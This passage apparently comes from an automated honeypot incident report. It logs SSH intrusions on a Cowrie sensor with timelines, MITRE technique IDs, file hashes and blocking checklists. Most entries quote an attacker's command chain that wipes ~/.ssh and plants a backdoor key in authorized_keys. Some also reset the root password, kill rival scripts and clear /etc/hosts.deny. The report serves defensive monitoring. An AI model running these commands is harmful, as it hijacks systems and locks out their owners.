| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:23:03` | `cowrie.session.connect` |
| `2026-06-02 08:23:03` | `cowrie.client.version` |
| `2026-06-02 08:23:03` | `cowrie.client.kex` |
| `2026-06-02 08:23:04` | `cowrie.login.success` |
| `2026-06-02 08:23:05` | `cowrie.session.params` |
| `2026-06-02 08:23:05` | `cowrie.command.input` |
| `2026-06-02 08:23:05` | `cowrie.command.failed` |
| `2026-06-02 08:23:05` | `cowrie.log.closed` |
| `2026-06-02 08:23:05` | `cowrie.session.params` |
| `2026-06-02 08:23:05` | `cowrie.command.input` |
| `2026-06-02 08:23:06` | `cowrie.session.file_download` |
| `2026-06-02 08:23:06` | `cowrie.log.closed` |
| `2026-06-02 08:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13720ce43e2

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:23 |
| **Last Seen** | 2026-06-02 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:23:14` | `cowrie.session.connect` |
| `2026-06-02 08:23:14` | `cowrie.client.version` |
| `2026-06-02 08:23:14` | `cowrie.client.kex` |
| `2026-06-02 08:23:15` | `cowrie.login.success` |
| `2026-06-02 08:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0cb02105982

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:26 |
| **Last Seen** | 2026-06-02 08:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:26:22` | `cowrie.session.connect` |
| `2026-06-02 08:26:22` | `cowrie.client.version` |
| `2026-06-02 08:26:22` | `cowrie.client.kex` |
| `2026-06-02 08:26:23` | `cowrie.login.success` |
| `2026-06-02 08:26:24` | `cowrie.session.params` |
| `2026-06-02 08:26:24` | `cowrie.command.input` |
| `2026-06-02 08:26:24` | `cowrie.command.failed` |
| `2026-06-02 08:26:24` | `cowrie.log.closed` |
| `2026-06-02 08:26:25` | `cowrie.session.params` |
| `2026-06-02 08:26:25` | `cowrie.command.input` |
| `2026-06-02 08:26:25` | `cowrie.session.file_download` |
| `2026-06-02 08:26:25` | `cowrie.log.closed` |
| `2026-06-02 08:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5216976a4542

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:26 |
| **Last Seen** | 2026-06-02 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:26:33` | `cowrie.session.connect` |
| `2026-06-02 08:26:33` | `cowrie.client.version` |
| `2026-06-02 08:26:34` | `cowrie.client.kex` |
| `2026-06-02 08:26:34` | `cowrie.login.success` |
| `2026-06-02 08:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149e21118dcf

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-06-02 08:33 |
| **Last Seen** | 2026-06-02 08:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:33:05` | `cowrie.session.connect` |
| `2026-06-02 08:33:05` | `cowrie.client.version` |
| `2026-06-02 08:33:05` | `cowrie.client.kex` |
| `2026-06-02 08:33:06` | `cowrie.login.success` |
| `2026-06-02 08:33:06` | `cowrie.session.params` |
| `2026-06-02 08:33:06` | `cowrie.command.input` |
| `2026-06-02 08:33:06` | `cowrie.command.failed` |
| `2026-06-02 08:33:06` | `cowrie.log.closed` |
| `2026-06-02 08:33:06` | `cowrie.session.params` |
| `2026-06-02 08:33:06` | `cowrie.command.input` |
| `2026-06-02 08:33:07` | `cowrie.session.file_download` |
| `2026-06-02 08:33:07` | `cowrie.log.closed` |
| `2026-06-02 08:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-916aee9db2f7

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-06-02 08:33 |
| **Last Seen** | 2026-06-02 08:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:33:09` | `cowrie.session.connect` |
| `2026-06-02 08:33:09` | `cowrie.client.version` |
| `2026-06-02 08:33:10` | `cowrie.client.kex` |
| `2026-06-02 08:33:10` | `cowrie.login.success` |
| `2026-06-02 08:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933139eb55f0

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:36 |
| **Last Seen** | 2026-06-02 08:37 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:G2ksax4aHpsM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:36:33` | `cowrie.session.connect` |
| `2026-06-02 08:36:33` | `cowrie.client.version` |
| `2026-06-02 08:36:33` | `cowrie.client.kex` |
| `2026-06-02 08:36:34` | `cowrie.login.success` |
| `2026-06-02 08:36:35` | `cowrie.session.params` |
| `2026-06-02 08:36:35` | `cowrie.command.input` |
| `2026-06-02 08:36:35` | `cowrie.command.failed` |
| `2026-06-02 08:36:35` | `cowrie.log.closed` |
| `2026-06-02 08:36:36` | `cowrie.session.params` |
| `2026-06-02 08:36:36` | `cowrie.command.input` |
| `2026-06-02 08:36:36` | `cowrie.session.file_download` |
| `2026-06-02 08:36:36` | `cowrie.log.closed` |
| `2026-06-02 08:36:47` | `cowrie.session.params` |
| `2026-06-02 08:36:47` | `cowrie.command.input` |
| `2026-06-02 08:36:48` | `cowrie.log.closed` |
| `2026-06-02 08:36:48` | `cowrie.session.params` |
| `2026-06-02 08:36:48` | `cowrie.command.input` |
| `2026-06-02 08:36:48` | `cowrie.log.closed` |
| `2026-06-02 08:36:49` | `cowrie.session.params` |
| `2026-06-02 08:36:49` | `cowrie.command.input` |
| `2026-06-02 08:36:49` | `cowrie.session.file_download` |
| `2026-06-02 08:36:49` | `cowrie.log.closed` |
| `2026-06-02 08:36:50` | `cowrie.session.params` |
| `2026-06-02 08:36:50` | `cowrie.command.input` |
| `2026-06-02 08:36:50` | `cowrie.log.closed` |
| `2026-06-02 08:36:51` | `cowrie.session.params` |
| `2026-06-02 08:36:51` | `cowrie.command.input` |
| `2026-06-02 08:36:51` | `cowrie.log.closed` |
| `2026-06-02 08:36:51` | `cowrie.session.params` |
| `2026-06-02 08:36:51` | `cowrie.command.input` |
| `2026-06-02 08:36:51` | `cowrie.command.input` |
| `2026-06-02 08:36:53` | `cowrie.log.closed` |
| `2026-06-02 08:36:53` | `cowrie.session.params` |
| `2026-06-02 08:36:53` | `cowrie.command.input` |
| `2026-06-02 08:36:54` | `cowrie.log.closed` |
| `2026-06-02 08:36:54` | `cowrie.session.params` |
| `2026-06-02 08:36:54` | `cowrie.command.input` |
| `2026-06-02 08:36:55` | `cowrie.log.closed` |
| `2026-06-02 08:36:55` | `cowrie.session.params` |
| `2026-06-02 08:36:55` | `cowrie.command.input` |
| `2026-06-02 08:36:56` | `cowrie.log.closed` |
| `2026-06-02 08:36:56` | `cowrie.session.params` |
| `2026-06-02 08:36:56` | `cowrie.command.input` |
| `2026-06-02 08:36:57` | `cowrie.log.closed` |
| `2026-06-02 08:36:57` | `cowrie.session.params` |
| `2026-06-02 08:36:57` | `cowrie.command.input` |
| `2026-06-02 08:36:58` | `cowrie.log.closed` |
| `2026-06-02 08:36:58` | `cowrie.session.params` |
| `2026-06-02 08:36:58` | `cowrie.command.input` |
| `2026-06-02 08:36:59` | `cowrie.log.closed` |
| `2026-06-02 08:36:59` | `cowrie.session.params` |
| `2026-06-02 08:36:59` | `cowrie.command.input` |
| `2026-06-02 08:36:59` | `cowrie.log.closed` |
| `2026-06-02 08:37:00` | `cowrie.session.params` |
| `2026-06-02 08:37:00` | `cowrie.command.input` |
| `2026-06-02 08:37:00` | `cowrie.log.closed` |
| `2026-06-02 08:37:01` | `cowrie.session.params` |
| `2026-06-02 08:37:01` | `cowrie.command.input` |
| `2026-06-02 08:37:01` | `cowrie.log.closed` |
| `2026-06-02 08:37:01` | `cowrie.session.params` |
| `2026-06-02 08:37:01` | `cowrie.command.input` |
| `2026-06-02 08:37:02` | `cowrie.log.closed` |
| `2026-06-02 08:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2578a2ef437

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:49 |
| **Last Seen** | 2026-06-02 08:50 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Ba57t0cuPMUZ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:49:54` | `cowrie.session.connect` |
| `2026-06-02 08:49:54` | `cowrie.client.version` |
| `2026-06-02 08:49:55` | `cowrie.client.kex` |
| `2026-06-02 08:49:56` | `cowrie.login.success` |
| `2026-06-02 08:49:56` | `cowrie.session.params` |
| `2026-06-02 08:49:56` | `cowrie.command.input` |
| `2026-06-02 08:49:56` | `cowrie.command.failed` |
| `2026-06-02 08:49:57` | `cowrie.log.closed` |
| `2026-06-02 08:49:57` | `cowrie.session.params` |
| `2026-06-02 08:49:57` | `cowrie.command.input` |
| `2026-06-02 08:49:57` | `cowrie.session.file_download` |
| `2026-06-02 08:49:57` | `cowrie.log.closed` |
| `2026-06-02 08:50:08` | `cowrie.session.params` |
| `2026-06-02 08:50:08` | `cowrie.command.input` |
| `2026-06-02 08:50:08` | `cowrie.log.closed` |
| `2026-06-02 08:50:09` | `cowrie.session.params` |
| `2026-06-02 08:50:09` | `cowrie.command.input` |
| `2026-06-02 08:50:09` | `cowrie.log.closed` |
| `2026-06-02 08:50:09` | `cowrie.session.params` |
| `2026-06-02 08:50:09` | `cowrie.command.input` |
| `2026-06-02 08:50:10` | `cowrie.session.file_download` |
| `2026-06-02 08:50:10` | `cowrie.log.closed` |
| `2026-06-02 08:50:10` | `cowrie.session.params` |
| `2026-06-02 08:50:10` | `cowrie.command.input` |
| `2026-06-02 08:50:11` | `cowrie.log.closed` |
| `2026-06-02 08:50:11` | `cowrie.session.params` |
| `2026-06-02 08:50:11` | `cowrie.command.input` |
| `2026-06-02 08:50:12` | `cowrie.log.closed` |
| `2026-06-02 08:50:12` | `cowrie.session.params` |
| `2026-06-02 08:50:12` | `cowrie.command.input` |
| `2026-06-02 08:50:12` | `cowrie.command.input` |
| `2026-06-02 08:50:13` | `cowrie.log.closed` |
| `2026-06-02 08:50:14` | `cowrie.session.params` |
| `2026-06-02 08:50:14` | `cowrie.command.input` |
| `2026-06-02 08:50:14` | `cowrie.log.closed` |
| `2026-06-02 08:50:14` | `cowrie.session.params` |
| `2026-06-02 08:50:14` | `cowrie.command.input` |
| `2026-06-02 08:50:15` | `cowrie.log.closed` |
| `2026-06-02 08:50:16` | `cowrie.session.params` |
| `2026-06-02 08:50:16` | `cowrie.command.input` |
| `2026-06-02 08:50:16` | `cowrie.log.closed` |
| `2026-06-02 08:50:16` | `cowrie.session.params` |
| `2026-06-02 08:50:16` | `cowrie.command.input` |
| `2026-06-02 08:50:17` | `cowrie.log.closed` |
| `2026-06-02 08:50:17` | `cowrie.session.params` |
| `2026-06-02 08:50:17` | `cowrie.command.input` |
| `2026-06-02 08:50:18` | `cowrie.log.closed` |
| `2026-06-02 08:50:18` | `cowrie.session.params` |
| `2026-06-02 08:50:18` | `cowrie.command.input` |
| `2026-06-02 08:50:18` | `cowrie.log.closed` |
| `2026-06-02 08:50:19` | `cowrie.session.params` |
| `2026-06-02 08:50:19` | `cowrie.command.input` |
| `2026-06-02 08:50:19` | `cowrie.log.closed` |
| `2026-06-02 08:50:19` | `cowrie.session.params` |
| `2026-06-02 08:50:19` | `cowrie.command.input` |
| `2026-06-02 08:50:20` | `cowrie.log.closed` |
| `2026-06-02 08:50:20` | `cowrie.session.params` |
| `2026-06-02 08:50:20` | `cowrie.command.input` |
| `2026-06-02 08:50:21` | `cowrie.log.closed` |
| `2026-06-02 08:50:21` | `cowrie.session.params` |
| `2026-06-02 08:50:21` | `cowrie.command.input` |
| `2026-06-02 08:50:21` | `cowrie.log.closed` |
| `2026-06-02 08:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ba3428643c

| Field | Detail |
|---|---|
| **Source IP** | `103.69.96[.]120` |
| **First Seen** | 2026-06-02 09:07 |
| **Last Seen** | 2026-06-02 09:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:07:57` | `cowrie.session.connect` |
| `2026-06-02 09:07:57` | `cowrie.client.version` |
| `2026-06-02 09:07:57` | `cowrie.client.kex` |
| `2026-06-02 09:07:57` | `cowrie.login.success` |
| `2026-06-02 09:07:58` | `cowrie.session.params` |
| `2026-06-02 09:07:58` | `cowrie.command.input` |
| `2026-06-02 09:07:58` | `cowrie.command.failed` |
| `2026-06-02 09:07:58` | `cowrie.log.closed` |
| `2026-06-02 09:07:58` | `cowrie.session.params` |
| `2026-06-02 09:07:58` | `cowrie.command.input` |
| `2026-06-02 09:07:58` | `cowrie.session.file_download` |
| `2026-06-02 09:07:58` | `cowrie.log.closed` |
| `2026-06-02 09:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.69.96[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.69.96[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9195fbc70474

| Field | Detail |
|---|---|
| **Source IP** | `103.69.96[.]120` |
| **First Seen** | 2026-06-02 09:08 |
| **Last Seen** | 2026-06-02 09:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:08:05` | `cowrie.session.connect` |
| `2026-06-02 09:08:05` | `cowrie.client.version` |
| `2026-06-02 09:08:05` | `cowrie.client.kex` |
| `2026-06-02 09:08:05` | `cowrie.login.success` |
| `2026-06-02 09:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.69.96[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.69.96[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0176696b3d1f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:20 |
| **Last Seen** | 2026-06-02 09:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:20:14` | `cowrie.session.connect` |
| `2026-06-02 09:20:14` | `cowrie.client.version` |
| `2026-06-02 09:20:14` | `cowrie.client.kex` |
| `2026-06-02 09:20:14` | `cowrie.login.success` |
| `2026-06-02 09:20:15` | `cowrie.session.params` |
| `2026-06-02 09:20:15` | `cowrie.command.input` |
| `2026-06-02 09:20:15` | `cowrie.command.failed` |
| `2026-06-02 09:20:15` | `cowrie.log.closed` |
| `2026-06-02 09:20:15` | `cowrie.session.params` |
| `2026-06-02 09:20:15` | `cowrie.command.input` |
| `2026-06-02 09:20:15` | `cowrie.session.file_download` |
| `2026-06-02 09:20:15` | `cowrie.log.closed` |
| `2026-06-02 09:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e418875e990

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:20 |
| **Last Seen** | 2026-06-02 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 09:20:17` | `cowrie.session.connect` |
| `2026-06-02 09:20:17` | `cowrie.client.version` |
| `2026-06-02 09:20:17` | `cowrie.client.kex` |
| `2026-06-02 09:20:17` | `cowrie.login.success` |
| `2026-06-02 09:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]59` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f72ea25fcec

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]59` |
| **First Seen** | 2026-06-02 09:29 |
| **Last Seen** | 2026-06-02 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
